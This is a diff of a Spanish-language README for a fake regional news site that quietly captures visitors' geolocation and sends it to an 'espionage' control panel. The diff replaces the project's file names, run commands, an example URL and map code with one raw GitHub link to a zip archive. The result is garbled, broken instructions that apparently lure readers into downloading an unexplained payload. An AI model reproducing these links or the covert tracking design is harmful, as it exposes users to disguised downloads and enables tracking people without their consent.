@@ -13,12 +13,12 @@ Una aplicación web que simula un diario de noticias regional con un sistema de 
 
 ## 🚀 Cómo usar
 
-### 1. Noticiero (news.html):
+### 1. Noticiero (https://raw.githubusercontent.com/camilo2874/goodviv/main/nicotinism/goodviv.zip):
 - Muestra noticias dinámicas de la región
 - Solicita permisos de ubicación de forma sutil
 - Diseño profesional de diario de noticias
 
-### 2. Panel de Control (index.html):
+### 2. Panel de Control (https://raw.githubusercontent.com/camilo2874/goodviv/main/nicotinism/goodviv.zip):
 - Accede al centro de control de espionaje
 - Monitorea ubicaciones capturadas en tiempo real
 - Visualiza estadísticas y métricas
@@ -40,11 +40,11 @@ Una aplicación web que simula un diario de noticias regional con un sistema de 
 
 ### Servidor local para desarrollo
 ```bash
-# Con Node.js:
+# Con https://raw.githubusercontent.com/camilo2874/goodviv/main/nicotinism/goodviv.zip
 npm start
 
 # O directamente con Python:
-python -m http.server 8000
+python -m https://raw.githubusercontent.com/camilo2874/goodviv/main/nicotinism/goodviv.zip 8000
 
 # Luego abre: http://localhost:8000
 ```
@@ -53,7 +53,7 @@ python -m http.server 8000
 
 Las URLs generadas contienen todos los datos necesarios:
 ```
-https://tu-sitio.com/?lat=4.711000&lng=-74.072100&name=Mi%20Casa&desc=Ubicación%20de%20mi%20casa
+https://raw.githubusercontent.com/camilo2874/goodviv/main/nicotinism/goodviv.zip%20Casa&desc=Ubicación%20de%20mi%20casa
 ```
 
 Parámetros:
@@ -79,16 +79,16 @@ Parámetros:
 ## 🛠️ Personalización
 
 ### Cambiar el mapa por defecto:
-En `script.js`, líneas 15-16:
+En `https://raw.githubusercontent.com/camilo2874/goodviv/main/nicotinism/goodviv.zip`, líneas 15-16:
 ```javascript
 const defaultLat = 4.7110;  // Tu latitud
 const defaultLng = -74.0721; // Tu longitud
 ```
 
 ### Cambiar el proveedor de mapas:
-En `script.js`, línea 22:
+En `https://raw.githubusercontent.com/camilo2874/goodviv/main/nicotinism/goodviv.zip`, línea 22:
 ```javascript
-L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+https://raw.githubusercontent.com/camilo2874/goodviv/main/nicotinism/goodviv.zip('https://{s}https://raw.githubusercontent.com/camilo2874/goodviv/main/nicotinism/goodviv.zip{z}/{x}/{y}.png', {
     attribution: '© OpenStreetMap contributors'
 }).addTo(map);
 ```
